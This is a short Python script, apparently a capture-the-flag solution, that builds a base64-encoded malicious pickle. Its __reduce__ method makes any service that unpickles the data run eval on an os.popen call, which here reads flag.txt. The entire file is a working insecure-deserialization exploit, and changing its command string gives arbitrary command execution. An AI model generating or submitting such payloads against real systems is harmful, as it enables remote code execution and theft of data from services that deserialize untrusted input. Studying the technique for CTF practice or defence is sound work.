import pickle
import base64


class Exploit:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('cat flag.txt').read()",))


p = pickle.dumps(Exploit(), protocol=2)
print(base64.b64encode(p).decode())
